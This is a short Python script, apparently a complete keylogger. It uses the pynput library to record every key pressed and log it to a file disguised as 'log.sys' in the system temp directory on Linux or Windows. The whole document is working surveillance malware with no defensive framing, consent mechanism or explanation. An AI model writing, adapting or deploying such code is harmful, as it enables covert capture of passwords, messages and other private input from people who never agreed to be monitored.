from pynput.keyboard import Key, Listener
import logging
import platform
import tempfile

if platform.system().lower() == "linux":
	path=tempfile.gettempdir()+"/log.sys"
if platform.system().lower() == "windows":
	path=tempfile.gettempdir() + "\\log.sys"
logging.basicConfig(filename=(path), level=logging.DEBUG, format='%(message)s')

def on_press(key):
    logging.info(key)

with Listener(on_press=on_press) as listener:
    listener.join()
